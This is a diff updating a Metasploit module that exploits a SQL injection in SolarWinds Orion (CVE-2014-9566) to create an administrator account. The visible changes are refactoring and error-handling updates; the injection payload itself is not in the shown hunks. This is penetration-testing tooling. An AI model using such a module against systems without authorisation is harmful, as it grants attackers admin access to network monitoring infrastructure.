@@ -1,22 +1,17 @@
 ##
-# This module requires Metasploit: http//:metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
       'Name'           => 'Solarwinds Orion AccountManagement.asmx GetAccounts Admin Creation',
       'Description'    => %q{
-      This module exploits a stacked SQL injection in order to add an administrator user to the
-      SolarWinds Orion database.
+        This module exploits a stacked SQL injection in order to add an administrator user to the
+        SolarWinds Orion database.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -27,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
         [
           ['CVE', '2014-9566']
         ],
-      'DisclosureDate' => 'Feb 24 2015'
+      'DisclosureDate' => '2015-02-24'
     ))
 
     register_options(
@@ -36,7 +31,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [ true, "Base Orion directory path", '/']),
         OptString.new('USERNAME', [true, 'The username to authenticate as', 'Guest']),
         OptString.new('PASSWORD', [false, 'The password to authenticate with', ''])
-      ], self.class)
+      ])
 
   end
 
@@ -64,11 +59,11 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res.nil?
-      fail_with("Server didn't respond in an expected way")
+      fail_with(Failure::UnexpectedReply, "Server didn't respond in an expected way")
     end
 
     if res.code == 200
-      fail_with("Authentication failed with username #{username}")
+      fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
     end
 
     return cookie + ';' + res.get_cookies
@@ -97,4 +92,3 @@ class Metasploit3 < Msf::Auxiliary
     print_good("The injection worked, log in with #{username} and a blank password")
   end
 end
-
